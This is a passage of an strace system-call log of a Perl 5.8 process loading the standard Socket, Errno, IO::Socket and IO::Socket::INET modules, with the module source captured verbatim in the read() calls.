1);\n\t    return;\n\t}\n", 4096) = 4096
10562 07:33:35.009707 stat64("/etc/perl/Socket.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009723 stat64("/etc/perl/Socket.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009736 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009749 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009762 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009775 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009789 stat64("/usr/lib/perl5/Socket.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009800 stat64("/usr/lib/perl5/Socket.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009814 stat64("/usr/share/perl5/Socket.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009826 stat64("/usr/share/perl5/Socket.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009839 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009851 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
10562 07:33:35.009872 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
10562 07:33:35.009885 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5988) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:35.009897 _llseek(8, 0, [0], SEEK_CUR) = 0
10562 07:33:35.009914 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
10562 07:33:35.010350 brk(0x8239000)    = 0x8239000
10562 07:33:35.010493 read(8, "", 4096) = 0
10562 07:33:35.010494 close(8)          = 0
10562 07:33:35.010542 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
10562 07:33:35.010567 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
10562 07:33:35.010594 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
10562 07:33:35.010609 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
10562 07:33:35.010698 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
10562 07:33:35.010716 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7cf5000
10562 07:33:35.010730 mmap2(0xb7cfa000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7cfa000
10562 07:33:35.010745 close(8)          = 0
10562 07:33:35.011427 brk(0x825a000)    = 0x825a000
10562 07:33:35.011578 stat64("/etc/perl/Errno.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.011595 stat64("/etc/perl/Errno.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.011609 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.011622 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.011636 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.011649 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.011662 stat64("/usr/lib/perl5/Errno.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.011674 stat64("/usr/lib/perl5/Errno.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.011687 stat64("/usr/share/perl5/Errno.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.011699 stat64("/usr/share/perl5/Errno.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.011712 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.011724 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
10562 07:33:35.011745 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
10562 07:33:35.011759 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5988) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:35.011771 _llseek(8, 0, [0], SEEK_CUR) = 0
10562 07:33:35.011830 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
10562 07:33:35.012617 read(8,  <unfinished ...>
10560 07:33:35.012636 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10560 07:33:35.012659 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10560 07:33:35.012673 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10560 07:33:35.012684 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10560 07:33:35.012697 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
10560 07:33:35.012711 waitpid(-1,  <unfinished ...>
10562 07:33:35.012735 <... read resumed> "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
10562 07:33:35.025320 _llseek(8, 5966, [5966], SEEK_SET) = 0
10562 07:33:35.025340 _llseek(8, 0, [5966], SEEK_CUR) = 0
10562 07:33:35.025351 close(8)          = 0
10562 07:33:35.025765 brk(0x827b000)    = 0x827b000
10562 07:33:35.036163 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
10562 07:33:35.036661 _llseek(6, 6698, [6698], SEEK_SET) = 0
10562 07:33:35.036678 _llseek(6, 0, [6698], SEEK_CUR) = 0
10562 07:33:35.036689 close(6)          = 0
10562 07:33:35.036709 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.036725 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.036739 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.036753 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.036767 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.036780 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.036800 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.036814 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.036828 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.036840 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.036854 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.036867 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
10562 07:33:35.036889 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
10562 07:33:35.036905 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5e38) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:35.036917 _llseek(6, 0, [0], SEEK_CUR) = 0
10562 07:33:35.036947 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ 